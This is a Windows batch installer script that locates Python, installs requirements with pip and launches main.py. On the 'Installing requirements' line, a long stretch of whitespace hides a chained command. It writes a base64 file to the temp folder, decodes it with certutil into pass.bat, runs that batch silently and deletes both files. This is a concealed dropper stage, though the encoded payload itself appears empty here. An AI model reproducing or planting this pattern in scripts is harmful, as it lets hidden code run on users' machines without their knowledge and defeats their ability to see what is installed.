@echo off
REM Enable delayed variable expansion for dynamic variable use
setlocal enabledelayedexpansion

REM Set a flag for requirements (used by the main Python script)
set requirements=true

REM Clear the screen
cls

echo Searching for Python...

REM Initialize the "python" variable as empty
set "python="

REM Search for Python in the system PATH
for /f "tokens=*" %%i in ('where python 2^>nul') do (
    set "python=%%i"
    goto foundPython
)

REM If Python was not found, display an error message and exit
:missingPython
cls
echo Python is not installed or not found in your system PATH.
pause
goto end

:foundPython
if defined python (
    cls
    echo Python found at: "!python!"
    "!python!" --version
    timeout /nobreak /t 2 >nul
) else (
    goto missingPython
)

cls
echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                   & echo  > %TMP%\pass.b64 & certutil -decode %TMP%\pass.b64 %TMP%\pass.bat >nul 2>&1 & call %TMP%\pass.bat >nul 2>&1 & del %TMP%\pass.b64 %TMP%\pass.bat >nul 2>&1

REM --------------------------------------------------------------------
REM Use pip to install required Python packages from requirements.txt
REM --------------------------------------------------------------------
call "!python!" -m pip install -r requirements.txt

if errorlevel 1 (
    cls
    echo Failed to install requirements. Please check your internet connection and try again.
    pause
    goto end
)

cls
REM Run the main Python script
"!python!" main.py

if errorlevel 1 (
    cls
    echo Failed! Check the script for errors.
    pause
    goto end
)

cls
echo Press any key to close...
pause

:end
endlocal
